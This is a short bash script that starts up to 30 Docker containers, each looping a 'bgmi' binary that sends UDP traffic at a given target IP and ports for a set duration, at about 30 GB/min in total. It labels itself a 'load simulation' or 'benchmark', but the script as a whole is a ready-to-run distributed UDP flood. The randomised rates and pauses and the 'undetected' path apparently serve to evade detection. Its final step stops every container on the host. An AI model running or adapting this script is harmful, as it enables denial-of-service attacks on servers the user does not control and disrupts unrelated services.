#!/bin/bash
set -e

mkdir -p logs

if [ "$#" -lt 3 ]; then
  echo "Usage: $0 <target-ip> <start-port> <duration> [container-count=30]"
  exit 1
fi

TARGET="$1"
START_PORT="$2"
DURATION="$3"
CONTAINERS="${4:-30}"

TOTAL_RATE_MBPS=512  # 512 MBps = 30 GB/min

RATE_PER_CONTAINER=$((TOTAL_RATE_MBPS / CONTAINERS))

echo "[*] Starting 30GB/min UDP load simulation to $TARGET..."

# Build the Docker image
docker build -t bgmi .

# Run multiple containers to distribute the load
for i in $(seq 1 "$CONTAINERS"); do
  PORT=$((START_PORT + i))
  RATE=$((RANDOM % (RATE_PER_CONTAINER + 1)))

  LOGFILE="logs/bgmi.log"

  docker run -d \
  --name bgmi-runner-$i \
  --network host \
  -v /workspaces/undetected/undetected/logs:/logs \
  bgmi bash -c "
    while true; do
      echo \"[INFO][bgmi] Benchmarking to $TARGET:$PORT @ ${RATE}MBps for ${DURATION}s\" >> /logs/bgmi.log
      /workspaces/undetected/undetected/bgmi -p 1000 -t 8 --ip $TARGET --port $PORT --rate-limit ${RATE}MBps --duration $DURATION >> /logs/bgmi.log 2>&1
      echo \"[INFO][bgmi] Sleeping for random pause...\" >> /logs/bgmi.log
      sleep \$((RANDOM % 3 + 2))  # Random sleep between 2 to 5 seconds
    done
  "
done

# Wait for benchmarking to finish (sleep for the duration of the benchmark)
sleep "$DURATION"

# Stop all running Docker containers
echo "[*] Stopping all running Docker containers..."
docker stop $(docker ps -q)

echo "[✓] Simulated 30GB/min UDP load via $CONTAINERS containers and stopped all containers."
